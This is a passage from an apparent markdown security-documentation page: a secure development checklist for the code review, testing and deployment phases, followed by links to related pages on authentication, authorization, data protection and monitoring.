- [ ] Secure error handling (no information leakage)

### Code Review Phase
- [ ] Security-focused code review completed
- [ ] Sensitive data handling reviewed
- [ ] Authentication/authorization logic verified
- [ ] Input validation coverage verified
- [ ] Error handling security reviewed
- [ ] Cryptographic usage reviewed
- [ ] Logging security verified

### Testing Phase
- [ ] Security unit tests written and passing
- [ ] Integration security tests completed
- [ ] Penetration testing performed
- [ ] Vulnerability scanning completed
- [ ] Security regression tests implemented

### Deployment Phase
- [ ] Security headers configured
- [ ] TLS/HTTPS properly configured
- [ ] Security monitoring enabled
- [ ] Audit logging configured
- [ ] Incident response procedures in place

## Related Documentation

- [Authentication Security](../authentication/jwt-security.md) - JWT and session security
- [Authorization](../authorization/role-based-access.md) - Access control implementation
- [Data Protection](../data-protection/encryption.md) - Data encryption and protection
- [Security Monitoring](../monitoring/audit-logging.md) - Security monitoring and logging